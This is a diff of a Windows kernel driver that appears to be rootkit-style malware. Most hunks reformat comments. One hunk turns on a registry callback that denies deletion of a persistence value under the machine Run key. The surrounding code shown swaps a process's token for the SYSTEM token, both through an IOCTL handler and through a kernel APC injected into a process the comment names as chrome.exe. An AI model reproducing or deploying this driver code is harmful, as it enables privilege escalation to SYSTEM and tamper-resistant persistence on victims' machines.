@@ -19,9 +19,9 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	};
 	OB_CALLBACK_REGISTRATION reg = {
 		OB_FLT_REGISTRATION_VERSION,
-		1,										// operation count
-		altitude,								// altitude
-		nullptr,							    // context
+		1,				// operation count
+		altitude,			// altitude
+		nullptr,			// context
 		operations
 	};
 
@@ -311,8 +311,8 @@ NTSTATUS SetTokenToSystem_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCAT
 			return status;
 		
 		auto* const token = ::PsReferencePrimaryToken(process);		// Get the process token										
-		status = SetTokenToSystem(process, token);							// Replace the process token with system token		
-		::ObDereferenceObject(token);										// Dereference the process token
+		status = SetTokenToSystem(process, token);			// Replace the process token with system token		
+		::ObDereferenceObject(token);					// Dereference the process token
 
 		return status;
 	}
@@ -323,29 +323,27 @@ NTSTATUS SetTokenToSystem_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCAT
 }
 
 NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) {
-	UNREFERENCED_PARAMETER(Argument1);
-	UNREFERENCED_PARAMETER(Argument2);
-	//REG_DELETE_VALUE_KEY_INFORMATION* deleteValueInfo = nullptr;
-	//PCUNICODE_STRING name = nullptr;
+	REG_DELETE_VALUE_KEY_INFORMATION* deleteValueInfo = nullptr;
+	PCUNICODE_STRING name = nullptr;
 
-	//switch (static_cast<REG_NOTIFY_CLASS>(reinterpret_cast<ULONG_PTR>(Argument1)))
-	//{
-	//case RegNtPreDeleteValueKey:
+	switch (static_cast<REG_NOTIFY_CLASS>(reinterpret_cast<ULONG_PTR>(Argument1)))
+	{
+	case RegNtPreDeleteValueKey:
 
-	//	deleteValueInfo = static_cast<REG_DELETE_VALUE_KEY_INFORMATION*>(Argument2);
-	//	if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
-	//		
-	//		// filter out key deletions
-	//		if (0 == ::wcsncmp(name->Buffer, REG_MACHINE REG_RUN_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_RUN_KEY_PATH) - 1)) {
+		deleteValueInfo = static_cast<REG_DELETE_VALUE_KEY_INFORMATION*>(Argument2);
+		if (NT_SUCCESS(::CmCallbackGetKeyObjectIDEx(&g_Globals.RegistryRegistrationCookie, deleteValueInfo->Object, nullptr, &name, 0))) {
+			
+			// filter out key deletions
+			if (0 == ::wcsncmp(name->Buffer, REG_MACHINE REG_RUN_KEY_PATH, ARRAYSIZE(REG_MACHINE REG_RUN_KEY_PATH) - 1)) {
 
-	//			// filter out value deletions
-	//			if (0 == ::wcsncmp(deleteValueInfo->ValueName->Buffer, REG_VALUE_NAME, ARRAYSIZE(REG_VALUE_NAME) - 1)) {
-	//				KdPrint((DRIVER_PREFIX "[+] Registry value deletion attempt detected\n"));
-	//				return STATUS_ACCESS_DENIED;
-	//			}			
-	//		}
-	//	}
-	//}
+				// filter out value deletions
+				if (0 == ::wcsncmp(deleteValueInfo->ValueName->Buffer, REG_VALUE_NAME, ARRAYSIZE(REG_VALUE_NAME) - 1)) {
+					KdPrint((DRIVER_PREFIX "[+] Registry value deletion attempt detected\n"));
+					return STATUS_ACCESS_DENIED;
+				}			
+			}
+		}
+	}
 
 	// No match found
 	return STATUS_SUCCESS;
@@ -417,10 +415,10 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
 			
 			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)
 				{				
-					auto* const process = ::PsGetCurrentProcess();			// Get current process (i.e. chrome.exe)
+					auto* const process = ::PsGetCurrentProcess();		// Get current process (i.e. chrome.exe)
 					auto* const token = ::PsReferencePrimaryToken(process);	// Get the process token
-					SetTokenToSystem(process, token);						// Replace the process token with system token
-					::ObDereferenceObject(token);							// Dereference the process token
+					SetTokenToSystem(process, token);			// Replace the process token with system token
+					::ObDereferenceObject(token);				// Dereference the process token
 					
 					// Thread and Process creation notification callbacks are not needed anymore
 					::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
